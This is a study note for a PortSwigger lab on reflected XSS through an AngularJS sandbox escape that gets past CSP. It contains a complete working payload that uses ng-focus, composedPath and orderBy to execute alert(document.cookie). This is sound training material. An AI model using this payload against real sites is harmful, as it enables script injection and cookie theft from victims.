# Lab: Reflected XSS with AngularJS sandbox escape and CSP

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)

## Lab idea

This challenge combines reflected input, AngularJS expression evaluation, a framework sandbox, and CSP. It practices analyzing multiple client-side defenses and the boundaries between template interpretation and browser policy.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script>…
2. Click "Store" and "Deliver exploit to victim".

## Payloads / key values
- `YOUR-LAB-ID`
- `<script> location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>`
- `ng-focus`
- `$event`
- `path`
- `window`
- `|`
- `orderBy`
- `alert`
- `z`
- `$event.path`

## Official source
- [PortSwigger Academy: Lab: Reflected XSS with AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)
